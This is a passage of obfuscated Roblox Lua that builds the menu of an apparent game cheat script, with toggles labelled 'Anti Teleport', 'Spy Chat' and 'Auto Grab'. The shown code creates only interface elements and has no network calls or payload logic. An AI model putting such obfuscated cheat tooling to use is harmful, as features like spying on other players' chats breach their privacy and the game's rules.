_llza[_sc(51,52,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,52,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,52,56)]);
_llza[_sc(51,52,57)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,52,57)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,52,97)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,52,56)]);
_llza[_sc(51,52,97)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,52,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,52,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,52,97)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(51,52,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,52,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,52,98)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,52,97)]);
_llza[_sc(51,52,98)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,52,98)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,52,99)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,52,53)]);
_llza[_sc(51,52,99)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,52,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,52,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,52,99)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,52,99)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,52,99)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,52,99)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(51,52,99)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,52,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,52,99)][_sc(84,101,120,116)]=[[Anti Teleport]];
_llza[_sc(51,52,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,52,99)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,52,99)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(51,52,100)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,52,99)]);
_llza[_sc(51,52,100)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(51,52,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,52,99)]);
_llza[_sc(51,52,101)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,52,102)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,52,53)]);
_llza[_sc(51,52,102)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,53,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,98)]);
_llza[_sc(51,53,48)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 255);
_llza[_sc(51,53,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,53,48)][_sc(78,97,109,101)]=[[leftside]];
_llza[_sc(51,53,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,53,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,53,48)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(-0.00038, 0, 0, 0);
_llza[_sc(51,53,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,53,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,48)]);
_llza[_sc(51,53,49)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 160);
_llza[_sc(51,53,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,53,49)][_sc(78,97,109,101)]=[[mainTab]];
_llza[_sc(51,53,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,53,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(51,53,50)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,53,49)]);
_llza[_sc(51,53,50)][_sc(78,97,109,101)]=_sc(109,97,105,110,83,99,114,105,112,116,84,67,79);
_llza[_sc(51,53,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,49)]);
_llza[_sc(51,53,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(51,53,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,53,51)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(51,53,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,53,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,53,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,53,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,51)]);
_llza[_sc(51,53,52)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(51,53,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,53,52)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(51,53,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,53,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(51,53,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(51,53,53)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(51,53,52)]);
_llza[_sc(51,53,54)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(51,53,49)]);
_llza[_sc(51,53,54)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(51,53,54)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(51,53,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,49)]);
_llza[_sc(51,53,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(51,53,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,53,55)][_sc(78,97,109,101)]=[[======TITLE======]];
_llza[_sc(51,53,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,53,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,53,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,53,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,53,56)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,53,55)]);
_llza[_sc(51,53,56)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,53,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,53,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,53,56)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,53,56)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,53,56)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(51,53,56)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,53,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(51,53,56)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,53,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,53,56)][_sc(84,101,120,116)]=[[Main]];
_llza[_sc(51,53,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,53,56)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,53,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(51,53,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,53,56)]);
_llza[_sc(51,53,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,53,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,53,56)]);
_llza[_sc(51,53,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(51,53,98)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,53,55)]);
_llza[_sc(51,53,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,53,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,53,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,53,98)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(51,53,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,53,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,53,98)][_sc(83,105,122,101)]=UDim2.new(0, 35, 1, 0);
_llza[_sc(51,53,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,53,98)][_sc(84,101,120,116)]=[[-]];
_llza[_sc(51,53,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,53,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -30, 0, 0);
_llza[_sc(51,53,98)][_sc(78,97,109,101)]=[[minimise]];
_llza[_sc(51,53,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,53,49)]);
_llza[_sc(51,53,99)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,53,99)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(51,53,99)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(51,53,99)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(51,53,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,49)]);
_llza[_sc(51,53,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,53,100)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(51,53,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,53,100)][_sc(78,97,109,101)]=[[spychat]];
_llza[_sc(51,53,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,53,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,53,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,53,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,53,101)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,53,100)]);
_llza[_sc(51,53,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,53,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,53,101)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,53,101)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,53,101)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,53,101)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,53,101)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(51,53,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,53,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,53,101)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,53,102)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,53,101)]);
_llza[_sc(51,53,102)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(51,53,102)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(51,53,102)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,53,102)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,54,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,101)]);
_llza[_sc(51,54,48)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,54,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,54,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,54,48)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(51,54,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,54,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,54,48)]);
_llza[_sc(51,54,49)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,54,49)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,54,50)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,54,48)]);
_llza[_sc(51,54,50)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,54,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,54,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,54,50)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(51,54,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,54,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,54,51)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,54,50)]);
_llza[_sc(51,54,51)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,54,51)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,54,52)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,53,100)]);
_llza[_sc(51,54,52)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,54,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,54,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,54,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,54,52)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,54,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,54,52)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(51,54,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,54,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,54,52)][_sc(84,101,120,116)]=[[Spy Chat]];
_llza[_sc(51,54,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,54,52)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,54,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(51,54,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,54,52)]);
_llza[_sc(51,54,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(51,54,54)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,54,52)]);
_llza[_sc(51,54,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,54,55)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,53,100)]);
_llza[_sc(51,54,55)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,54,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,49)]);
_llza[_sc(51,54,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,54,56)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(51,54,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,54,56)][_sc(78,97,109,101)]=[[autograb]];
_llza[_sc(51,54,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,54,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,54,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,54,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,54,57)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,54,56)]);
_llza[_sc(51,54,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,54,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,54,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,54,57)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,54,57)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,54,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,54,57)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(51,54,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,54,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,54,57)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,54,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,54,57)]);
_llza[_sc(51,54,97)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(51,54,97)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(51,54,97)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,54,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,54,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,54,57)]);
_llza[_sc(51,54,98)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,54,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,54,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,54,98)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(51,54,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,54,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,54,98)]);
_llza[_sc(51,54,99)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,54,99)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,54,100)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,54,98)]);
_llza[_sc(51,54,100)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,54,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,54,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,54,100)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(51,54,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,54,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,54,101)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,54,100)]);
_llza[_sc(51,54,101)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,54,101)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,54,102)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,54,56)]);
_llza[_sc(51,54,102)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,54,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,54,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,54,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,54,102)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,54,102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,54,102)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(51,54,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,54,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,54,102)][_sc(84,101,120,116)]=[[Auto Grab]];
_llza[_sc(51,54,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,54,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,54,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(51,55,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,54,102)]);
_llza[_sc(51,55,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(51,55,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,54,102)]);
_llza[_sc(51,55,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,55,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,54,56)]);
_llza[_sc(51,55,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,55,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,49)]);
_llza[_sc(51,55,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(51,55,51)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=4;
_llza[_sc(51,55,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,55,51)][_sc(78,97,109,101)]=[[disabledeletesound]];
_llza[_sc(51,55,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,55,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,55,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,55,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,55,52)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,55,51)]);
_llza[_sc(51,55,52)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(51,55,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,55,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,55,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,55,52)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,55,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,55,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,55,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,55,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,55,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,55,52)][_sc(78,97,109,101)]=[[button]];
